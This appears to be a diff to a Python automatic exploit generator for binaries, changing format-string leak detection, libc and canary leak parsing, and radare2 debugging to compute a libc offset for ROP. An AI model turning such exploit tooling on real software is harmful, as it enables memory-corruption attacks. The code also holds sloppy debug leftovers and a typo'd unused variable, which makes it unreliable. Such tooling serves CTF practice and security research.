@@ -67,7 +67,6 @@ class Raeg:
         p = self.start_process()
 
         prompt = p.recvline()
-        print(prompt)
         p.sendline(b"%p")
         output = b""
         try:
@@ -444,6 +443,7 @@ class Raeg:
 
         if self.string_address == None:
             #Perform a write primitive
+            print(self.has_libc_leak)
             if self.has_libc_leak == True:
                 self.rop_libc()
             else:
@@ -492,9 +492,10 @@ class Raeg:
                         log.info(f"Found canary leak at offset {i}:{address}")
                         logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
 
-                    libc_leak = re.search(r"0x7f[a-f0-9]{8}4a", address)
+                    libc_leak = re.search(r"0x7f[a-f0-9]+34a", address)
                     if libc_leak:
                         self.libc_offset_string = offset_str.split(".")[0]
+                        print(self.libc_offset_string)
                         self.has_libc_leak = True
                         logging.getLogger("pwnlib").setLevel(logging.INFO)
                         log.info(f"Found libc leak for libc_start_main at offset {i}:{address}")
@@ -520,6 +521,7 @@ class Raeg:
                 p.close()
             except:
                 log.info("BOZO")
+            p.close()
 
         logging.getLogger("pwnlib").setLevel(logging.INFO)
 
@@ -537,10 +539,16 @@ class Raeg:
 
 
         # Random r2pipe commands that gets the memory map of the libc base and runs the program for the leak
-
+        # For some reason r2pipe will mess up the order of the commands or skip a command output when returning
+        # So just adding a bunch of random commands seems to work
         self.r2.cmd("aa")
+        # Break on main
         self.r2.cmd("dcu main")
         command_buffer = []
+        command_buffer.append(self.r2.cmd("dc"))
+        command_buffer.append(self.r2.cmd("dc"))
+        # Get libc base while running
+        # Have to append to a command buffer because the output of the command is not always aligned
         command_buffer.append(self.r2.cmd("dm | grep libc.so -m 1"))
         command_buffer.append(self.r2.cmd("dc"))
         command_buffer.append(self.r2.cmd("dc"))
@@ -550,25 +558,37 @@ class Raeg:
         for command in command_buffer:
             if "libc" in command:
                 libc_base_debug = command
-                print(libc_base_debug)
             if "Leak" in command:
                 debug_output = command
-                print(debug_output)
+        debug_lines = debug_output.split("\n")
+
+        for line in debug_lines:
+            if "Leak" in line:
+               debug_output = line
+
+
+        for line in debug_lines:
+            if "Leak" in line:
+                debug_output = line
+
+        debug_ouput = debug_output.split("Leak")
 
 
 
-        #start_addr = self.elf.sym["main"]
-
-        #state = self.proj.factory.entry_state(
-            #addr=start_addr,
-            #stdin=self.libc_offset_string
-        #)
-
+        leak_address = re.findall(r"0x7f[A-Fa-f0-9]+", debug_output)[-1]
+        libc_base_address = re.search(r"0x[0]+7f[A-Fa-f0-9]+", libc_base_debug)
+        leak_address = int(leak_address, 16)
+        if libc_base_address:
+            libc_base_address = int(libc_base_address.group(),16)
 
 
 
-        #debug_leak = None
 
+        self.libc_offset = libc_base_address - leak_address
+
+        print("Cleaning disgusting r2 shit off of screen")
+        os.system("clear")
+        print(self.libc_offset)
 
 
         return None
